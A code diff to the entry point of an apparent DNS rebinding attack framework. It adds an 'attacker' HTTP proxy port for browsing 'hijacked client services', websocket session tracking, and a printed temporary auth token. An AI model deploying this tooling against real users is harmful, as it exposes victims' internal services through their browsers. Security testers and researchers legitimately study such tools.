@@ -40,7 +40,8 @@ func initFromCmdLine() *singularity.AppConfig {
 	var responseReboundIPAddrtimeOut = flag.Int("responseReboundIPAddrtimeOut", 300,
 		"Specify delay (s) for which we will keep responding with Rebound IP Address after last query. After delay, we will respond with  ResponseReboundIPAddr.")
 	var dangerouslyAllowDynamicHTTPServers = flag.Bool("dangerouslyAllowDynamicHTTPServers", false, "DANGEROUS if the flag is set (to anything). Specify if any target can dynamically request Singularity to allocate an HTTP Server on a new port.")
-
+	var httpProxyServerPort = flag.Int("httpProxyServerPort", 3129,
+		"Specify the attacker HTTP Proxy Server port that permits to browse hijacked client services.")
 	flag.Var(&myArrayPortFlags, "HTTPServerPort", "Specify the attacker HTTP Server port that will serve HTML/JavaScript files. Repeat this flag to listen on more than one HTTP port.")
 
 	flag.Parse()
@@ -59,6 +60,7 @@ func initFromCmdLine() *singularity.AppConfig {
 	appConfig.ResponseReboundIPAddrtimeOut = *responseReboundIPAddrtimeOut
 	appConfig.HTTPServerPorts = myArrayPortFlags
 	appConfig.AllowDynamicHTTPServers = *dangerouslyAllowDynamicHTTPServers
+	appConfig.HTTPProxyServerPort = *httpProxyServerPort
 
 	return &appConfig
 }
@@ -66,13 +68,22 @@ func initFromCmdLine() *singularity.AppConfig {
 func main() {
 
 	appConfig := initFromCmdLine()
-	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState),
-		RebindingStrategy: appConfig.RebindingFnName}
+	authToken, err := singularity.GenerateRandomString()
+	if err != nil {
+		panic(fmt.Sprintf("could not generate a random number: %v", err))
+	}
+	fmt.Printf("Temporary secret: %v\n", authToken)
+	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState)}
+	wscss := &singularity.WebsocketClientStateStore{Sessions: make(map[string]*singularity.WebsocketClientState)}
 	hss := &singularity.HTTPServerStoreHandler{DynamicServers: make([]*http.Server, 2),
 		StaticServers:           make([]*http.Server, 1),
 		Errc:                    make(chan singularity.HTTPServerError, 1),
 		AllowDynamicHTTPServers: appConfig.AllowDynamicHTTPServers,
-		Dcss:                    dcss}
+		Dcss:                    dcss,
+		Wscss:                   wscss,
+		HTTPProxyServerPort:     appConfig.HTTPProxyServerPort,
+		AuthToken:               authToken,
+	}
 
 	// Attach DNS handler function
 	dns.HandleFunc(".", singularity.MakeRebindDNSHandler(appConfig, dcss))
@@ -93,7 +104,7 @@ func main() {
 
 	for _, port := range appConfig.HTTPServerPorts {
 		// Start HTTP Servers
-		httpServer := singularity.NewHTTPServer(port, hss, dcss)
+		httpServer := singularity.NewHTTPServer(port, hss, dcss, wscss)
 		httpServerErr := singularity.StartHTTPServer(httpServer, hss, false)
 
 		if httpServerErr != nil {
@@ -101,6 +112,14 @@ func main() {
 		}
 
 	}
+
+	httpProxyServer := singularity.NewHTTPProxyServer(hss.HTTPProxyServerPort, dcss, wscss, hss)
+	httpProxyServerErr := singularity.StartHTTPProxyServer(httpProxyServer)
+
+	if httpProxyServerErr != nil {
+		log.Fatalf("Main: Could not start proxy HTTP Server instance: %v", httpProxyServerErr)
+	}
+
 	expiryDuration := time.Duration(appConfig.ResponseReboundIPAddrtimeOut) * time.Second
 	expireClientStateTicker := time.NewTicker(expiryDuration)
 
